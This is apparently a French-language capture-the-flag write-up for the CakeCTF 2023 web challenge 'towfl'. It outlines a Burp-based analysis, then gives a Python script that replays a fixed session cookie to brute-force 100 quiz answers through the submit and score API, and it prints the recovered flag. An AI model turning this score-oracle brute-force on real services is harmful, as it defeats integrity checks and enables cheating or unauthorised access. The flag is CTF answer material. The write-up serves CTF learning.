
## TAGS : #WEB 


# <u>étapes résumés : </u>
### 1️⃣Découverte site :
	-->réponses random plusieurs fois donc conclusion :
		les réponses sont générées aléatoirements
 
### 2️⃣Utilisation de Burp :
	-->découverte du cookie session( change à chaque génération du quiz )
	-->récup des requetes ( POST pour envoyer les réponses GET pour récup le score par rapport au score envoyé )
	--> Dans les deux requetes on touche pas le cookie ( pour rester dans la même session et donc garder les même réponses)

### 3️⃣Utilisation de Python
	-->Utilisation de requests ( pour les requêtes ) et json pour récup les données
	--> passage de requetes sur burp à python = merci google
	--> bruteforce ( ligne/index/valeurs )
	--> remplissage de la variable data (les 100 réponses)

### 4️⃣Utilisation de Burp
	--> On peut rajouter une requête en bas mais j'ai 
	oublié et flemme de relancer tout le bruteforce du coup
	--> Relance (manuellement) des deux requetes :
	--post(réponses)
	--get(score par rapport au réponses)

# 🟢<u>Réponse finale :</u>🟢

```
{
"data":{
"flag":"\"CakeCTF{b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3}\"",
"score":100
},
"status":"ok"
}
```

```python
  
import requests

import json

#partie post

url_post = "http://towfl.2023.cakectf.com:8888/api/submit"

headers_post = {

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36", "Content-Type": "application/json",

"Accept": "*/*",

"Origin": "http://towfl.2023.cakectf.com:8888",

"Referer": "http://towfl.2023.cakectf.com:8888/",

"Accept-Encoding": "gzip, deflate, br",

"Accept-Language": "en-US,en;q=0.9",

"Cookie": "session=.eJwFwYENgDAIBMBdmIBCpeA2_QKJMxh39-6lepJu6k7dtgJAJzBYwuVMlEI2a4PdxqW6ok2r4LO1eFtckmeK0_cDKsYU_Q.ZU9iCQ.vQSA_GK9NtKJ6vRquAoVIYP-ipc",

"Connection": "close"

}

  

""" ------------------------------------------------------------------------------------------------------------ """

  

#partie get

url_get = "http://towfl.2023.cakectf.com:8888/api/score"

headers_get = {

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36",

"Accept": "*/*",

"Referer": "http://towfl.2023.cakectf.com:8888/",

"Accept-Encoding": "gzip, deflate, br",

"Accept-Language": "en-US,en;q=0.9",

"Cookie": "session=.eJwFwYENgDAIBMBdmIBCpeA2_QKJMxh39-6lepJu6k7dtgJAJzBYwuVMlEI2a4PdxqW6ok2r4LO1eFtckmeK0_cDKsYU_Q.ZU9iCQ.vQSA_GK9NtKJ6vRquAoVIYP-ipc",

"Connection": "keep-alive"

}

  

#Aide avec burp pour trouver tout le bordel ( headers parametres etc )

old_score = None

data = [[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None],

[None,None,None,None,None,None,None,None,None,None]]

  

#bruteforce ligne/index/valeurs (ordre des if)

for line in range(10):
	for index in range(10):
		found_answer = False
		for value in range(4):
			data[line][index] = value
			  
			# POST request
			print("post")
			response = requests.post(url_post, headers=headers_post, data=json.dumps(data))
			print(response.status_code)
			print(response.text)
			
			# GET request
			print("get avec value = ", value)
			response = requests.get(url_get, headers=headers_get)
			score = json.loads(response.text)['data']['score']
			if old_score is None:
				old_score = 0
			# Compare scores
			if score > old_score:
				print("Score+1 avec value = ", value)
				old_score = score
				data[line][index] = value
				print(data)
				found_answer = True
				break # sort de la boucle if
			print("-------------------------")
		if found_answer:
			continue # skip l'itération value ()
		print("-------------DONE 1 INDEX----------------------")
	print("-------------DONE 1 LINE----------------------")
```
